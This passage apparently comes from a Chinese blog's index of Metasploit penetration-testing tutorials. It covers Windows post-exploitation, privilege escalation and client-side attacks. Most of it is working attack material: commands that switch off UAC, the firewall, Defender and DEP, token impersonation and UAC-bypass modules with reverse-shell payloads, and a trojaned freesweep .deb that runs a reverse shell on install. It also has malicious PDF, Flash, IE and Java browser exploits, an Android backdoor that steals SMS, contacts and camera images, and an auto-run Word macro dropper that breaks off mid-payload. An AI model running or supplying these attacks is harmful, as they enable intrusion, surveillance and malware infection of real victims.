class="code"><pre><span class="line">shell</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure></li><li><p><strong>关闭防火墙</strong></p><ul><li>需要管理员或system权限</li><li><code>shell</code></li><li><code>netsh advfirewall set allprofiles state off</code></li></ul></li><li><p><strong>关闭Windefend</strong> (win10自带防护)</p><ul><li><code>net stop windefend</code></li></ul></li><li><p><strong>Bitlocker 磁盘加密</strong></p><ul><li><code>manage-bde -off C:</code></li><li><code>manage-bde -status C:</code></li></ul></li><li><p><strong>关闭 DEP</strong> (数据执行保护)</p><ul><li><code>bcdedit.exe /set {current} nx AlwaysOff</code></li></ul></li><li><p><strong>杀死防病毒软件</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run killav</code></li><li><code>run post/windows/manage/killav</code></li></ul></li><li><p><strong>开启远程桌面服务</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run post/windows/manage/enable_rdp</code>        开启远程</li><li><code>run multi_console_command -rc /root/.*.txt</code>        关闭远程</li><li><code>run getgui –e</code><ul><li><code>run getgui -u owl -p 12313</code>        #添加一条远程账号组的账号</li><li><code>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</code></li></ul></li></ul></li><li><p><strong>查看远程桌面</strong></p><ul><li>screenshot    #屏幕截图</li><li>use espia    #加载截图插件<ul><li>screengrab    #屏幕截图</li></ul></li></ul></li></ul><h4 id="Tokens-插件"><a href="#Tokens-插件" class="headerlink" title="Tokens 插件"></a><strong>Tokens</strong> 插件</h4><ul><li><p>用户每次登录,账号绑定临时的token</p></li><li><p>访问资源时提交token进行身份验证,类似于WEB Cookie</p></li><li><p>Delegate Token: 交互登录会话</p></li><li><p>Impersonate Token: 非交互登录会话</p></li><li><p>Delegate Token账号注销后变为Impersonate Token,权限依然有效</p></li><li><p><strong>Incognito</strong></p><ul><li>独立功能的软件,被MSF集成在meterpreter中</li><li>无需密码破解或获取密码HASH,窃取Token将自己伪装成其他用户</li><li>尤其适用于域环境下提权渗透多操作系统</li></ul></li></ul><p><strong>搭建域环境</strong></p><ul><li><p>dcpromo Win03 + XP</p></li><li><p>XP DNS指向03域服务器IP</p></li><li><p><code>load incognito</code></p><ul><li><p><code>list_tokens -u</code>    #查看token列表</p></li><li><p><code>impersonate_token lab\\administrator</code> #伪装域管理员token</p></li><li><p>运行以上命令需要getsystem</p><ul><li><p>本地普通权限用户需先本地提权</p></li><li><p><code>use exploit/windows/local/ms10_015_kitrap0d</code></p><ul><li><code>show options</code></li><li><code>set session 1</code></li><li><code>set lhost 192.168.190.137</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>exploit -j</code></li></ul></li><li><p><code>execute -f cmd.exe -i -t</code>    # -t:使用当前假冒token执行程序</p></li><li><p><code>shell</code> </p></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> 提权 </tag>
            
            <tag> hashdump </tag>
            
            <tag> incognito </tag>
            
            <tag> token窃取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之提权</title>
      <link href="/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
      <url>/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<ul><li><p>已经获得目标系统控制权后扩大站果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>后门持久化</li></ul></li><li><p>基于已有session扩大站果</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exe</span><br></pre></td></tr></table></figure></li></ul><h4 id="获取system账号权限"><a href="#获取system账号权限" class="headerlink" title="获取system账号权限"></a><strong>获取system账号权限</strong></h4><p><strong>meterpreter</strong></p><pre><code>load privgetsystempriv_elevate_getsystem: Operation failed: Access is denied.</code></pre><ul><li>使用 <code>exploit/windows/local</code>下的模块 <strong>绕过UAC限制</strong> 进行getsystem提权  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#发起弹窗询问UAC权限赋予</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set filename up_data.exe</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#直接绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#注入dll动态链接库文件,绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">set session</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure></li></ul><h4 id="利用漏洞直接提权为-system"><a href="#利用漏洞直接提权为-system" class="headerlink" title="利用漏洞直接提权为 system"></a><strong>利用漏洞直接提权为 system</strong></h4><pre><code>#利用本地已有漏洞直接提权为SYSTEMuse exploit/windows/local/ms13_053_schlampereiinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_081_track_popup_menuinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_097_ie_registry_symlinkinfoset session 1set payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176show optionsexploit -juse exploit/windows/local/ppr_flatten_recinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -j</code></pre><p><strong>图形化payload</strong></p><pre><code>#利用VNC注入模块获取图形化payloadset payload windows/vncinject/reverse_tcpshow optionsset session 1set lhost 192.168.190.176set viewonly no        #可操作</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> 提权 </tag>
            
            <tag> 后门持久化 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF客户端渗透</title>
      <link href="/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/"/>
      <url>/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>在无法突破网络边界的情况下转而攻击客户端</strong></p><ul><li>社会工程学攻击</li><li>进而渗透线上业务网络</li></ul><p><strong>含有漏洞利用代码的WEB站点</strong></p><ul><li>利用客户端漏洞</li></ul><p><strong>含有漏洞利用代码的DOC,PDF等文档</strong></p><ul><li>诱骗被害者执行payload</li></ul><h4 id="诱骗被害者执行Payload-windows"><a href="#诱骗被害者执行Payload-windows" class="headerlink" title="诱骗被害者执行Payload(windows)"></a><strong>诱骗被害者执行Payload(windows)</strong></h4><p><strong>查看反弹连接的payload选项</strong></p><pre><code>msfvenom --list-options -p windows/shell/reverse_tcp</code></pre><p><strong>使用msfvenom生成Payload</strong></p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</code></pre><p><strong>使用msfvenom加编码生成Payload</strong></p><pre><code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o cat.exe</code></pre><p><strong>利用msf监听反弹连接</strong>    </p><pre><code>msfdb runuse exploit/multi/handlerset payload windows/shell/reverse_tcpset LHOST 1.1.1.1set LPORT 4444exploit</code></pre><h4 id="诱骗被害者执行Payload-Linux-Deb安装包"><a href="#诱骗被害者执行Payload-Linux-Deb安装包" class="headerlink" title="诱骗被害者执行Payload(Linux Deb安装包)"></a><strong>诱骗被害者执行Payload(Linux Deb安装包)</strong></h4><p><strong>apt-get只下载deb包不安装</strong></p><pre><code>apt-get --download-only install freesweep    </code></pre><p><strong>dpkg -x 解包到free文件夹</strong></p><pre><code>dpkg -x freesweep_0.90-1_i386.deb free        </code></pre><p><strong>创建DEBIAN文件夹然后进入文件夹</strong></p><pre><code>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></pre><p><code>vi control</code> <strong>写入以下内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Package: freesweep</span><br><span class="line">Version: 0.90-3</span><br><span class="line">Section: optional</span><br><span class="line">Architecture: i386</span><br><span class="line">Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)</span><br><span class="line">Description: a text-based minesweeper</span><br><span class="line">Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display - in linux console,in an xterm,and in most text-based terminals currently in use.</span><br><span class="line">postinst;</span><br></pre></td></tr></table></figure><p><code>vi postinst</code> <strong>写入以下脚本</strong></p><pre><code>#!/bin/sh#赋予执行权限并执行Payload并执行它,再执行正常程序sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;chmod 755 postinst</code></pre><p><strong>生成Payload到该目录</strong></p><pre><code>msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></pre><p><strong>打包deb</strong></p><pre><code>dpkg-deb --build /root/free</code></pre><h4 id="利用PDF阅读器漏洞执行payload"><a href="#利用PDF阅读器漏洞执行payload" class="headerlink" title="利用PDF阅读器漏洞执行payload"></a><strong>利用PDF阅读器漏洞执行payload</strong></h4><ul><li><p><strong>利用Acrobat Reader</strong></p></li><li><p>MsF构造PDF文件利用模块:</p><ul><li><p><code>use exploit/windows/fileformat/adobe_utilprintf</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>show options</code></li><li><code>exploit</code>        #生成包含payload的PDF文档</li></ul></li><li><p><code>use exploit/multi/handler</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>exploit -j</code></li></ul></li></ul></li></ul><ul><li><p>MsF构造恶意网站模块:</p><ul><li><p><code>use exploit/windows/browser/adobe_utilprintf</code></p><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code>    #设置服务端口</li><li><code>set URIPATH /</code>    #设置web根路径</li><li><code>set payload windows/meterpreter/reverse_tcp</code>        #设置payload</li><li><code>set lhost 192.168.254.175</code></li><li><code>exploit -j</code></li></ul></li><li><p><strong>Meterpreter</strong></p><ul><li><code>use priv</code>        #本地提权</li><li><code>run post/windows/capture/keylog_recorder</code></li></ul></li></ul></li></ul><h4 id="利用Flash插件漏洞执行payload"><a href="#利用Flash插件漏洞执行payload" class="headerlink" title="利用Flash插件漏洞执行payload"></a><strong>利用Flash插件漏洞执行payload</strong></h4><ul><li><p><code>adobe_flash_hacking_team_uaf</code>利用模块由Hacking Team 2015年被泄露后,录入MSF</p><ul><li><code>use exploit/multi/browser/adobe_flash_hacking_team_uaf</code><ul><li><code>info</code></li><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code></li></ul></li></ul></li><li><p><code>adobe_flash_opaque_background_uaf</code>利用模块也是由Hacking Team 2015年被泄露后,录入MSF        </p><ul><li><code>use exploit/multi/browser/adobe_flash_opaque_background_uaf</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code>    </li></ul></li></ul></li><li><p><code>browser_autopwn2</code>辅助模块可以把MSF里质量较好的所有浏览器漏洞利用模块统一启动起来</p><ul><li><code>use auxiliary/server/browser_autopwn2</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>exploit</code></li></ul></li></ul></li></ul><h4 id="利用IE浏览器漏洞执行payload"><a href="#利用IE浏览器漏洞执行payload" class="headerlink" title="利用IE浏览器漏洞执行payload"></a><strong>利用IE浏览器漏洞执行payload</strong></h4><pre><code>use exploit/windows/browser/Display all 246 possibilities? (y or n)        #MSF收录的浏览器漏洞利用模块目前有240+#使用ms14_064_ole_code_execution模块use exploit/windows/browser/ms14_064_ole_code_executioninfoshow optionsset SRVPORT 80set URIPATH /show targets        #针对Win xp 和 win7默认IE有效exploit</code></pre><h4 id="浏览器利用JRE漏洞执行payload"><a href="#浏览器利用JRE漏洞执行payload" class="headerlink" title="浏览器利用JRE漏洞执行payload"></a><strong>浏览器利用JRE漏洞执行payload</strong></h4><pre><code>#对java_jre1.7版本有效use exploit/multi/browser/java_jre17_driver_managershow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit#java_jre17_jmxbean模块use exploit/multi/browser/java_jre17_jmxbeanshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    #java_jre17_reflection_types模块use exploit/multi/browser/java_jre17_reflection_typesshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    </code></pre><h4 id="生成Android后门"><a href="#生成Android后门" class="headerlink" title="生成Android后门"></a><strong>生成Android后门</strong></h4><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R &gt; payload.apkuse exploit/multi/handlerset PAYLOAD android/meterpreter/reverse_tcpset LHOST 192.168.190.175exploit -jsearch     #搜索文件，命令：search text.jpgdownload #下载文件，命令：download test.jpgwebcam_list #查看摄像头列表，因为手机都是前置和后置摄像头了webcam_snap #拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1webcam_stream #开启摄像头视频监控，同上，命令：webcam_stream -i 1安卓系统相关命令：check_root #查看当前安卓是否已经rootdump_calllog #下载通话记录dump_contacts #下载短信记录dump_sms #下载通讯录geolocate #利用谷歌地图定位（需要安装谷歌地图）</code></pre><h4 id="VBScript感染方式"><a href="#VBScript感染方式" class="headerlink" title="VBScript感染方式"></a><strong>VBScript感染方式</strong></h4><ul><li><p>利用宏感染word,excel文档</p></li><li><p>绕过某些基于文件类型检查的安全机制</p></li><li><p><strong>生成VBScript脚本</strong>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -f vba-exe</span><br></pre></td></tr></table></figure></li><li><p><strong>Office 2007 +</strong></p><ul><li><strong>视图–宏–创建</strong></li><li><strong>Payload第一部分粘入VBA代码</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Sub Auto_Open()</span><br><span class="line">Glwsj12</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj12()</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj1 As String</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Dim Glwsj3 As Integer</span><br><span class="line">Dim Glwsj4 As Paragraph</span><br><span class="line">Dim Glwsj8 As Integer</span><br><span class="line">Dim Glwsj9 As Boolean</span><br><span class="line">Dim Glwsj5 As Integer</span><br><span class="line">Dim Glwsj11 As String</span><br><span class="line">Dim Glwsj6 As Byte</span><br><span class="line">Dim Gpxyxbdwpa as String</span><br><span class="line">Gpxyxbdwpa &#x3D; &quot;Gpxyxbdwpa&quot;</span><br><span class="line">Glwsj1 &#x3D; &quot;SWQeAqOHq.exe&quot;</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj3 &#x3D; FreeFile()</span><br><span class="line">Open Glwsj1 For Binary As Glwsj3</span><br><span class="line">For Each Glwsj4 in ActiveDocument.Paragraphs</span><br><span class="line">DoEvents</span><br><span class="line">Glwsj11 &#x3D; Glwsj4.Range.Text</span><br><span class="line">If (Glwsj9 &#x3D; True) Then</span><br><span class="line">Glwsj8 &#x3D; 1</span><br><span class="line">While (Glwsj8 &lt; Len(Glwsj11))</span><br><span class="line">Glwsj6 &#x3D; Mid(Glwsj11,Glwsj8,4)</span><br><span class="line">Put #Glwsj3, , Glwsj6</span><br><span class="line">Glwsj8 &#x3D; Glwsj8 + 4</span><br><span class="line">Wend</span><br><span class="line">ElseIf (InStr(1,Glwsj11,Gpxyxbdwpa) &gt; 0 And Len(Glwsj11) &gt; 0) Then</span><br><span class="line">Glwsj9 &#x3D; True</span><br><span class="line">End If</span><br><span class="line">Next</span><br><span class="line">Close #Glwsj3</span><br><span class="line">Glwsj13(Glwsj1)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj13(Glwsj10 As String)</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj7 &#x3D; Shell(Glwsj10, vbHide)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></li><li><strong>Paylaod第二部分粘入word文档正文</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Gpxyxbdwpa</span><br><span class="line">&amp;H4D&amp;H5A&amp;H90&amp;H00&amp;H03&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H80&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H1F&amp;HBA&amp;H0E&amp;H00&amp;HB4&amp;H09&amp;HCD&amp;H21&amp;HB8&amp;H01&amp;H4C&amp;HCD&amp;H21&amp;H54&amp;H68&amp;H69&amp;H73&amp;H20&amp;H70&amp;H72&amp;H6F&amp;H67&amp;H72&amp;H61&amp;H6D&amp;H20&amp;H63&amp;H61&amp;H6E&amp;H6E&amp;H6F&amp;H74&amp;H20&amp;H62&amp;H65&amp;H20&amp;H72&amp;H75&amp;H6E&amp;H20&amp;H69&amp;H6E&amp;H20&amp;H44&amp;H4F&amp;H53&amp;H20&amp;H6D&amp;H6F&amp;H64&amp;H65&amp;H2E&amp;H0D&amp;H0D&amp;H0A&amp;H24&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H50&amp;H45&amp;H00&amp;H00&amp;H4C&amp;H01&amp;H03&amp;H00&amp;H80&amp;H8B&amp;H40&amp;H38&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HE0&amp;H00&amp;H0F&amp;H03&amp;H0B&amp;H01&amp;H02&amp;H38&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H01&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H46&amp;H3A&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2E&amp;H74&amp;H65&amp;H78&amp;H74&amp;H00&amp;H00&amp;H00&amp;H28&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;H60&amp;H2E&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H00&amp;H90&amp;H0A&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H0C&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;HE0&amp;H2E&amp;H69&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H30&amp;HC0&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H20&amp;H40&amp;H00&amp;HFF&amp;HE0&amp;H90&amp;HFF&amp;H25&amp;H38&amp;H30&amp;H40&amp;H00&amp;H90&amp;H90&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&